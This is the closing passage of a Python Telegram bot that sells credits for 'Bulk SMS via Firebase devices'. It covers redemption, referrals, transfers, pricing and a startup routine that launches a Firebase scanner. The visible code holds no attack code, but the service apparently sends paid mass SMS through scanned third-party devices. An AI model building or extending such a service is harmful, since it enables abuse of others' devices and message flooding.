            reply_markup=kb([(sc('home'), "user:home")]), parse_mode="HTML"); return
    credits = cd["credits"]
    add_credits(uid, credits, d)
    cd["uses_left"] = cd.get("uses_left", 1) - 1
    cd.setdefault("used_by", []).append(uid)
    await safe_save(d)
    await msg.answer(f"{em(EMOJI_GIFT, '🎉')} <b>Redeemed!</b>\n💰 +{credits}\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(sc('home'), "user:home")]), parse_mode="HTML")

@R.message(S.redeem_code)
async def user_redeem_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf text bhejo.", parse_mode="HTML")

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    await safe_save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👥')} <b>Referral</b>\n\n"
        f"Har referral pe <b>{ref_credits}</b> credits!\n\n"
        f"🎁 Code: <code>{code}</code>\n\n"
        f"🔗 https://t.me/{me.username}?start={code}",
        reply_markup=kb([(sc('back'), "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"💰 Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"📤 SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
        f"📅 Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"📈 Bot Total: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([(sc('back'), "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not history:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Your History</b>\n\n<i>Empty.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Your History</b>\n"]
        for i, e in enumerate(reversed(history), 1):
            ts = fmt_time(e.get("timestamp", 0))
            num = e.get("number", "?")
            mp = e.get("message", "")[:30]
            st = e.get("status", "?")
            si = "✅" if st == "sent" else "🛑" if st == "stopped" else "⏳"
            lines.append(f"{i}. [{ts}] {si} <code>{mask_number(num)}</code> — {mp}")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([(sc('back'), "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi!", show_alert=True); return
    text = f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\n"
    for plan in plans:
        text += f"📋 <b>{plan['name']}</b>\n   💰 {plan['price']} {plan.get('currency', 'INR')} = 🎁 {plan['credits']} credits\n\n"
    rows = []
    for plan in plans:
        rows.append([btn_url(f"Buy {sc(plan['name'][:20])}", plan['payment_link'], EMOJI_MONEY, "💳")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>Bot {_VERSION}</b>\n\n"
        f"🤖 Bulk SMS via Firebase devices.\n\n"
        f"👤 Developer: <b>{OWNER_NAME}</b>\n"
        f"💬 Support: {SUPER_ADMIN_LINK}\n\n"
        f"<i>Referral se free credits paayein!</i>",
        reply_markup=kb([(sc('back'), "user:home")]), parse_mode="HTML",
        disable_web_page_preview=True)

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 Banned!", show_alert=True); return
    if not can_use(uid, d):
        await cq.answer("⛔ Access nahi!", show_alert=True); return
    cur = get_user_credits(uid, d)
    if cur < 2:
        await cq.answer("❌ Minimum 2 credits!", show_alert=True); return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer</b>\n\n"
        f"💰 Your: <b>{cur}</b>\n"
        f"⚠️ Sirf half transfer kar sakte hain!\n\nTarget User ID:",
        reply_markup=kb([(sc('cancel'), "user:home")]), parse_mode="HTML")

@R.message(S.transfer_credits_uid, F.text)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID.", parse_mode="HTML"); return
    if target_uid == uid:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Apne aap ko nahi!", parse_mode="HTML"); return
    if str(target_uid) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} User exist nahi!", parse_mode="HTML"); return
    cur = get_user_credits(uid, d)
    if cur < 2:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Min 2 credits!", parse_mode="HTML"); return
    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)
    half = cur // 2
    await msg.answer(f"{em(EMOJI_MONEY, '💸')} <b>Amount</b>\n\nTarget: <code>{target_uid}</code>\nMax: <b>{half}</b>",
        reply_markup=kb([(sc('cancel'), "user:home")]), parse_mode="HTML")

@R.message(S.transfer_credits_uid)
async def user_transfer_uid_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf ID.", parse_mode="HTML")

@R.message(S.transfer_credits_amount, F.text)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive.", parse_mode="HTML"); return
    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")
    cur = get_user_credits(uid, d)
    max_t = cur // 2
    if amount > max_t:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf {max_t} transfer ho sakte!", parse_mode="HTML"); return
    if not deduct_credits(uid, amount, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient!", parse_mode="HTML"); return
    add_credits(target_uid, amount, d)
    await safe_save(d)
    await state.clear()
    try:
        await msg.bot.send_message(target_uid,
            f"{em(EMOJI_MONEY, '💸')} <b>Received!</b>\nFrom: <code>{uid}</code>\n💰 +{amount}\n💳 Balance: {get_user_credits(target_uid, d)}",
            parse_mode="HTML")
    except: pass
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Transferred!</b>\nTo: <code>{target_uid}</code>\n💰 {amount}\n💳 Your: {get_user_credits(uid, d)}",
        reply_markup=kb([(sc('home'), "user:home")]), parse_mode="HTML")
    log_activity(d, "credit_transfer", uid, f"{amount} → {target_uid}")

@R.message(S.transfer_credits_amount)
async def user_transfer_amount_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

# ================= MAIN =================
async def main():
    global PROTECTED_NUMBERS, AUTO_CLEANUP_ENABLED

    # Initialize MongoDB first
    await init_mongo()

    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    d0 = load()
    PROTECTED_NUMBERS = d0.get("protected_numbers", {})
    AUTO_CLEANUP_ENABLED = d0.get("settings", {}).get("auto_cleanup", True)
    log.info(f"Auto-cleanup: {'ON' if AUTO_CLEANUP_ENABLED else 'OFF'}")

    me = await bot.get_me()
    log.info(f"@{me.username} — {_VERSION} started! Owner: {OWNER_NAME}")

    scanner_task = asyncio.create_task(background_firebase_scanner(bot))
    log.info("Scanner task created")

    try:
        await bot.send_message(MAIN_OWNER,
            f"{em(EMOJI_DIAMOND, '💎')} <b>{_VERSION} Online!</b>\n@{me.username}\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"👤 Owner: <b>{OWNER_NAME}</b>\n"
            f"🆔 <code>{MAIN_OWNER}</code>\n"
            f"📢 Log Channel: <code>{LOG_CHANNEL_ID}</code>\n"
            f"💾 <b>Database:</b> MongoDB (olympic)\n\n"
            f"✅ <b>All Features Active:</b>\n"
            f"• 📥 Online Firebase TXT Export\n"
            f"• 🗑 Auto-Delete Offline (3 scans)\n"
            f"• ⚠️ Delete All Firebases\n"
            f"• 🗑 Manual Clean Now\n"
            f"• ⚙️ Auto-Cleanup Toggle\n"
            f"• 💎 Premium icons & layout\n"
            f"• 💾 MongoDB (olympic db)\n"
            f"• 🛡 Role metadata tracking\n"
            f"• 🔒 Safe HTTP-only FB URLs",
            parse_mode="HTML")
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())
